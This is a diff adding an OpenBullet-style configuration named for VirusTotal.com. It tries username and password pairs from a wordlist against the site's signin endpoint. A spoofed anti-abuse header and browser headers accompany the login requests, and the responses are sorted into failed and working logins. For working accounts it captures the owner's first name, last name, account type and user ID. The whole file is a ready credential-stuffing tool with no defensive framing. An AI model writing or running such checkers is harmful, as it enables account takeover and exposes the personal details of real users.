@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "[CT] Virustotal.com [WEB]",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-24T15:25:41.9197461+03:00",
+  "AdditionalInfo": "",
+  "Author": "Astronot",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#POST REQUEST POST "https://www.virustotal.com/ui/signin" 
+  CONTENT "{\"data\":{\"user_id\":\"<USER>\",\"password\":\"<PASS>\",\"forever\":false}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-ianguage: en-US,en;q=0.9,es;q=0.8" 
+  HEADER "accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://www.virustotal.com" 
+  HEADER "referer: https://www.virustotal.com/" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"90\", \"Opera GX\";v=\"76\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 OPR/76.0.4017.227" 
+  HEADER "x-app-version: v1x31x2" 
+  HEADER "x-tool: vt-ui-main" 
+  HEADER "x-vt-anti-abuse-header: MTYzNjE5NDk5MzgtWkc5dWRDQmlaU0JsZG1scy0xNjI1ODY3ODY0LjU0OA==" 
+
+#KONTROL KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect user or password" 
+  KEYCHAIN Success OR 
+    KEY "\"status" 
+
+#Ad PARSE "<SOURCE>" JSON "first_name" CreateEmpty=FALSE -> CAP "Ad" 
+
+#Soyad PARSE "<SOURCE>" JSON "last_name" CreateEmpty=FALSE -> CAP "Soyad" 
+
+#Tür PARSE "<SOURCE>" JSON "type" CreateEmpty=FALSE -> CAP "Tür" 
+
+#Kullanıcı_Adı PARSE "<SOURCE>" JSON "id" CreateEmpty=FALSE -> CAP "Kullanıcı Adı" 
+
